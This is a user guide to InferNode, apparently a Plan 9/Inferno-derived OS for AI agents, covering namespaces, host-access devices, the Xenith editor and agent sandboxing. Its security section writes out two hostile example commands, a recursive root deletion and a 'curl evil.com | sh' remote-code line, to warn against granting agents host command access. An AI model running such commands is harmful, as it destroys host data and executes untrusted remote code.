## What is InferNode?

InferNode is an operating system designed for AI agents and the humans who work with them. It provides:

- A **sandboxed environment** where AI agents can work safely
- A **text-first interface** (Xenith) where everything is observable
- A **filesystem-as-API** model where programs communicate via files
- **Network transparency** via the 9P protocol

If you've used Unix, you'll find InferNode familiar. If you've used Plan 9, you'll feel at home. If you're an AI agent, you'll find an environment designed for you.

---

## Heritage

### Plan 9 from Bell Labs (1992)

Plan 9 was the "sequel" to Unix, created by many of the same people (Ken Thompson, Rob Pike, Dennis Ritchie). Its key insight: **everything is a file**, taken seriously.

In Unix, "everything is a file" is a nice idea but inconsistent. Network sockets, process information, and devices all have special APIs.

In Plan 9, this philosophy is complete:
- Network connections are files (`/net/tcp/0/data`)
- Process state is files (`/proc/123/status`)
- The window system is files (`/dev/mouse`, `/dev/draw`)
- Even the keyboard is a file (`/dev/cons`)

### Inferno® (1996)

Inferno® took Plan 9's ideas and made them portable. Instead of running on bare hardware, Inferno® runs as a "hosted" OS on top of other operating systems (macOS, Linux, Windows) or on bare metal.

Key additions:
- **Limbo** - A safe, garbage-collected language (like Go's ancestor)
- **Dis** - A virtual machine that runs Limbo bytecode
- **Styx/9P** - The network protocol that makes filesystems shareable

### InferNode (2024)

InferNode is Inferno® rebuilt for the AI age:
- **64-bit support** for modern hardware (ARM64, AMD64)
- **Xenith** - A text environment designed for AI-human collaboration
- **SDL3 graphics** - Modern GPU-accelerated rendering
- **AI agent isolation** - Namespace-based security for running untrusted agents

---

## Core Philosophy

### Everything is a File

Programs don't use special APIs to communicate. They read and write files.

```sh
# Get the current time
cat /dev/time

# See running processes
ls /prog

# Read mouse position
cat /dev/pointer
```

### The Filesystem is the API

Want to control a window? Write to its control file:
```sh
echo 'delete' > /mnt/xenith/1/ctl
```

Want to query an AI? Write to a file, read the response:
```sh
echo 'What is 2+2?' > /n/llm/ask
cat /n/llm/ask
```

No SDKs. No libraries. No protocol buffers. Just files.

### Namespaces are Private

Every process has its own view of the filesystem. What you see at `/n/web` might not exist for another process. This is the foundation of security: you can't access what isn't in your namespace.

### Text is Universal

Everything is text when possible. Configuration, communication, data exchange—all text. This means:
- You can inspect anything with `cat`
- You can modify anything with `echo`
- You can script anything with shell pipelines
- AI agents can understand everything

---

## The Namespace

The namespace is the most important concept in InferNode. It's your personal view of the filesystem.

### What is a Namespace?

In traditional operating systems, all processes see the same filesystem. If `/usr/bin/python` exists, everyone sees it.

In InferNode, each process has its own namespace—its own private filesystem view. Two processes can have completely different things at the same path.

```
Process A's view:          Process B's view:
/                          /
├── dev/                   ├── dev/
├── n/                     ├── n/
│   └── web/    ← exists   │   └── (empty)  ← doesn't exist
└── cmd/        ← exists   └── (no cmd)     ← can't run os
```

### How Namespaces are Built

Namespaces start empty and are built up with `bind` and `mount`:

```sh
# Bind a device into the namespace
bind '#C' /cmd              # Now /cmd exists

# Mount a network filesystem
mount 'tcp!server!564' /n/remote

# Bind one directory over another
bind -a /new/bin /dis       # Add /new/bin after /dis in search
```

### Namespace Inheritance

When you spawn a new process:
- **Default:** Child inherits parent's namespace
- **FORKNS:** Child gets a copy (changes don't affect parent)
- **NEWNS:** Child starts with empty namespace

This is how security works: spawn an AI agent with a restricted namespace, and it simply cannot access things outside that namespace.

### Common Namespace Operations

```sh
# See what's mounted where
ns

# Bind device, add after existing contents
bind -a '#I' /net

# Bind device, add before existing contents
bind -b '#U' /

# Bind with creation allowed
bind -c '#C' /cmd

# Mount remote filesystem
mount -a 'tcp!192.168.1.1!564' /n/remote

# Unmount
unmount /n/remote
```

---

## Virtual Devices

InferNode provides functionality through "virtual devices"—kernel-provided filesystems named with `#` followed by a letter.

### Essential Devices

| Device | Name | Purpose |
|--------|------|---------|
| `#C` | cmd | Execute host OS commands |
| `#U` | root | Access host filesystem |
| `#I` | ip | Network stack (TCP/IP) |
| `#p` | prog | Process information |
| `#c` | cons | Console I/O |
| `#m` | mnt | Mount driver |

### #C - The Command Device (Host Execution)

The `#C` device lets you run commands on the host operating system:

```sh
# Bind the device (usually done in profile)
bind -a '#C' /

# Now you can use the 'os' command
os ls -la
os which python
os brew list
```

**Security Note:** Any process with `#C` in its namespace can execute arbitrary host commands. Don't bind this for untrusted processes.

### #U - The Root Device (Host Filesystem)

The `#U` device provides access to the host's filesystem:

```sh
# Mount entire host filesystem
bind '#U*' /n/local

# Now /n/local is your host's /
ls /n/local/usr/local/bin
cat /n/local/etc/hosts

# Mount a specific path
bind '#U*/Library/TeX' /n/tex
```

The `*` means "root of host filesystem". Without it, `#U` mounts relative to Inferno®'s root.

### #I - The IP Device (Networking)

```sh
# Initialize networking
bind -a '#I' /net

# Now you can make connections
# (usually done by programs, not manually)
ls /net/tcp
```

### Combining Devices

Devices can be layered:

```sh
# Start with IP networking
bind -a '#I' /net

# Add host filesystem access
bind '#U*' /n/local

# Add command execution
bind -a '#C' /

# Mount a remote 9P server
mount 'tcp!fileserver!564' /n/remote
```

---

## Accessing the Host OS

When running under the emulator (emu), InferNode can interact with the host operating system.

### Running Host Commands: `os`

The `os` command executes programs on the host:

```sh
# Basic usage
os ls -la
os pwd
os whoami

# Get host's PATH
os printenv PATH

# Pipe data through host command
echo "teh quikc fox" | os aspell list

# Use full path if command not in PATH
os /Library/TeX/texbin/xelatex document.tex

# Run with different directory
os -d /tmp ls
```

### Path Translation: `-t` Flag

Host and Inferno paths are different. Use `-t` to translate:

```sh
# Without -t: passes Inferno path (won't work for most host tools)
os cat /n/local/etc/hosts        # Host sees "/n/local/etc/hosts" - wrong!

# With -t: translates to host path
os -t cat /n/local/etc/hosts     # Host sees "/etc/hosts" - correct!
```

### What PATH Does `os` Use?

The `os` command inherits the PATH from whatever launched the emulator:

- **From Terminal:** Your shell's full PATH
- **From macOS app bundle:** Minimal launchd PATH (`/usr/bin:/bin:/usr/sbin:/sbin`)

If tools like `brew` or `/opt/homebrew/bin/*` aren't found, either:
1. Launch from Terminal instead of the app
2. Use full paths: `os /opt/homebrew/bin/aspell list`

### Reading/Writing Host Files

Use `#U` to access host files directly from Inferno:

```sh
# Mount host filesystem
bind '#U*' /n/local

# Read a host file
cat /n/local/etc/hosts

# Write to a host file
echo 'hello' > /n/local/tmp/test.txt

# Copy between Inferno and host
cp /dis/sh /n/local/tmp/inferno-shell.dis
```

### Practical Examples

**Spell-check in Xenith:**
```
|os aspell list
```

**Format Go code:**
```
|os gofmt
```

**Run LaTeX:**
```sh
os /Library/TeX/texbin/xelatex mydocument.tex
```

**Use GitHub CLI:**
```sh
os gh pr list
os gh issue view 42
```

## The Shell Profile

When you start a login shell (`sh -l`), it runs `/lib/sh/profile` to set up your environment.

### What the Profile Does

```sh
#!/dis/sh.dis
load std                          # Load standard shell builtins

path=(/dis .)                     # Command search path

user="{cat /dev/user}             # Get username

mount -ac {mntgen} /n             # Mount namespace generator

bind -a '#I' /net                 # Initialize networking

# Mount LLM if available
mount -A 'tcp!127.0.0.1!5640' /n/llm >[2] /dev/null

# Setup home directory from host
if {~ $emuhost MacOSX Linux}{
    bind '#U*' /n/local
    home=/n/local/^`{echo 'echo $HOME' | os sh}
}

# Create and bind tmp
bind -bc $home/tmp /tmp

cd $home                          # Start in home directory
```

### Key Variables

| Variable | Purpose | Example |
|----------|---------|---------|
| `$path` | Command search path | `/dis` `.` |
| `$home` | Home directory | `/n/local/Users/yourname` |
| `$user` | Username | `yourname` |
| `$emuhost` | Host OS type | `MacOSX`, `Linux` |

### Customizing Your Environment

Create `$home/lib/profile` for personal customizations:

```sh
# ~/lib/profile
# Personal InferNode configuration

# Add custom command directory
path=(/n/local/usr/local/bin $path)

# Aliases via shell functions
fn gst { os git status }
fn gd { os git diff }

# Set editor
EDITOR=xenith
```

### The `#C` Trap

Note that the profile uses `os sh` to get `$HOME`. This means `#C` gets bound early. Any process that inherits this namespace (including Xenith) will have host command access.

---

## Working with Files

### Inferno Paths vs Host Paths

```
Inferno path:  /n/local/Users/yourname/Documents
Host path:     /Users/yourname/Documents
```

The `#U*` device maps host paths into Inferno's namespace at whatever mount point you choose.

### File Operations

```sh
# List files
ls /dis
ls -l /n/local/tmp

# Read files
cat /dev/time
cat /n/local/etc/hosts

# Write files
echo 'hello' > /tmp/test.txt

# Copy files
cp source dest
cp /n/local/file.txt /tmp/

# Remove files
rm /tmp/test.txt

# Create directories
mkdir /tmp/newdir
mkdir -p /tmp/a/b/c
```

### Text Processing

```sh
# Word wrap to 80 columns
fmt -l 80 document.txt

# Count lines/words/chars
wc file.txt

# Sort lines
sort file.txt

# Find unique lines
uniq file.txt

# Search for patterns
grep pattern file.txt
```

### Piping Through Host Tools

When Inferno tools aren't enough, pipe through the host:

```sh
# Use host's jq for JSON
cat data.json | os jq '.items[]'

# Use host's sed for complex substitution
cat file | os sed 's/old/new/g'

# Use host's python
echo 'print(2+2)' | os python3
```

---

## Xenith

Xenith is InferNode's text environment—a fork of Acme designed for AI-human collaboration.

### Starting Xenith

```sh
# From the command line
xenith

# With dark theme
xenith -t dark

# The macOS app bundle runs this automatically
```

### Basic Concepts

- **Windows** contain text (files, command output, scratch)
- **Tag line** at top of each window shows commands
- **Mouse chording** for selection and execution
- **Everything is text** that can be edited

### Mouse Actions

| Button | Action |
|--------|--------|
| Left | Select text |
| Middle | Execute selection as command |
| Right | Search/open selection |

### Commands in Tags

Click middle button on any word to execute it:
- `Put` - Save file
- `Del` - Delete window
- `New` - Create new window
- `Look` - Search for selection

### Piping Through External Commands

Select text, then middle-click on a pipe command:

```
|fmt -l 80          # Wrap selection to 80 columns
|os sort            # Sort lines via host
|os aspell list     # Spell check via host
<os date            # Insert host's date
>output.txt         # Write selection to file
```

### The 9P Interface

Xenith exposes itself as a filesystem at `/mnt/xenith/`:

```
/mnt/xenith/
├── 1/              # Window 1
│   ├── body        # Text content
│   ├── ctl         # Control commands
│   ├── tag         # Tag line
│   └── event       # Event stream
├── 2/              # Window 2
│   └── ...
├── new             # Create window (write to get id)
└── focus           # Currently focused window
```

This is how AI agents interact with Xenith—by reading and writing files.

---

## Security and AI Agent Isolation

### The Namespace is the Security Boundary

InferNode's security model is simple: **a process can only access what's in its namespace**.

An AI agent running in a restricted namespace:
```
/
├── mnt/
│   └── xenith/     ← Can edit text
├── n/
│   └── llm/        ← Can query AI
└── tmp/            ← Can use temp files
```

Cannot access:
- `/cmd` (no host command execution)
- `#U` (no host filesystem)
- `/net` (no network, unless explicitly granted)

### Creating a Restricted Namespace

```limbo
# In Limbo code
sys->pctl(Sys->NEWNS, nil);   # Start with empty namespace

# Only bind what the agent needs
sys->bind("/mnt/xenith", "/mnt/xenith", Sys->MREPL);
sys->bind("/tmp", "/tmp", Sys->MREPL|Sys->MCREATE);
```

### The `os` Command Risk

If `#C` is bound, any process can execute host commands:

```sh
os rm -rf /          # Catastrophic on host!
os curl evil.com | os sh   # Remote code execution!
```

**For trusted users:** This is convenient.
**For AI agents:** Don't bind `#C` in their namespace.

### Current Default Behavior

The default profile binds `#C` early (to get `$HOME`), so Xenith windows have full host access. This is fine when humans are in control.

For untrusted AI agents, you would:
1. Create a new namespace
2. Bind only safe resources
3. Spawn the agent in that namespace

---

## Common Tasks

### Reformatting Text

```sh
# Wrap prose to 70 columns (default)
fmt file.txt

# Wrap to specific width
fmt -l 80 file.txt

# In Xenith, select text and:
|fmt -l 80
```

### Using Host Package Managers

```sh
# List installed packages
os brew list

# Search for package (but ask user to install)
os brew search aspell

# On Linux
os apt list --installed
os dpkg -l | os grep vim
```

### Network Diagnostics

```sh
# Check if networking is set up
ls /net

# Ping via host
os ping -c 3 google.com

# DNS lookup via host
os nslookup example.com

# HTTP fetch via host
os curl -s https://example.com
```

### Working with Git

```sh
# All git operations through host
os git status
os git add .
os git commit -m "message"
os git push

# GitHub CLI
os gh pr list
os gh issue create --title "Bug" --body "Description"
```

### Processing JSON

InferNode prefers text, but when you must deal with JSON:

```sh
# Pretty print
cat data.json | os jq .

# Extract field
cat data.json | os jq '.name'

# Filter array
cat data.json | os jq '.items[] | select(.active)'
```

### Running Python Scripts

```sh
# One-liner
echo 'print(2+2)' | os python3

# Run a script from host filesystem
os python3 /path/to/script.py

# Run a script accessible via Inferno path (with translation)
os -t python3 /n/local/path/to/script.py
```

---

## Troubleshooting

### Command Not Found

```sh
; somecommand
sh: somecommand: '/dis/somecommand' file does not exist
```

**For Inferno® commands:** Check `$path` and `/dis`:
```sh
echo $path
ls /dis | grep somecommand
```

**For host commands:** Use `os`:
```sh
os somecommand
os which somecommand
```

### `os` Can't Find Host Commands

If `os which brew` fails, the command isn't in the inherited PATH.

**Solution 1:** Use full path:
```sh
os /opt/homebrew/bin/brew list
```

**Solution 2:** Launch emu from Terminal (not app bundle):
```sh
./emu/MacOSX/o.emu -r. sh -l -c 'xenith -t dark'
```

### Permission Denied

```sh
; cat /cmd/clone
cat: can't open /cmd/clone: does not exist
```

The `#C` device isn't bound. Either:
```sh
bind -a '#C' /
```
Or this was intentional (restricted namespace).

### Mount Failed

```sh
; mount 'tcp!server!564' /n/remote
mount: ...
```

Check:
1. Is networking initialized? `ls /net`
2. Is the server running?
3. Is the port correct?
4. Network path: `os ping server`

### Namespace Confusion

```sh
; ls /n/llm
ls: /n/llm: does not exist
```

The mount point doesn't exist in your namespace. Check what's mounted:
```sh
ns
```

Mount it if needed:
```sh
mount -A 'tcp!127.0.0.1!5640' /n/llm
```
